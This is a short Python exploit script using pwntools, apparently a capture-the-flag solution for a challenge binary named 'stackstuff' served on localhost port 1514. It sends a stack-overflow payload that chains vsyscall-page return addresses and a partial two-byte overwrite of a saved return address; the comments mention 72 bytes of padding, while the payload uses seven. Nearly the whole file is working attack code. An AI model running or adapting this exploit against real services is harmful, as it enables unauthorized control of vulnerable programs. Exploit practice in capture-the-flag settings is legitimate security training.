from pwn import *
#proc = process('./stackstuff')

# Have to write 90 bytes
# Buffer Addr - Ret Addr = 72 bytes
# 72 byte padding, ret addr, next qword, least significant two bytes
target = remote("127.0.0.1", 1514)

payload = b"0"*7
payload += p64(0xffffffffff600400)
payload += p64(0xffffffffff600400)
payload += b"\x8b\x10"

print(target.recv(100,timeout=1))
print(target.recv(100,timeout=1))
print(target.recv(100,timeout=1))
print(target.recv(100,timeout=1))
target.sendline(b'100')
print(target.recvline(timeout=1))
print(target.recvline(timeout=1))
target.sendline(payload)

#
for _ in range(10):
    try:
        print(target.recv(100,timeout=1))
    except:
        print("Done?")
        break

target.close()
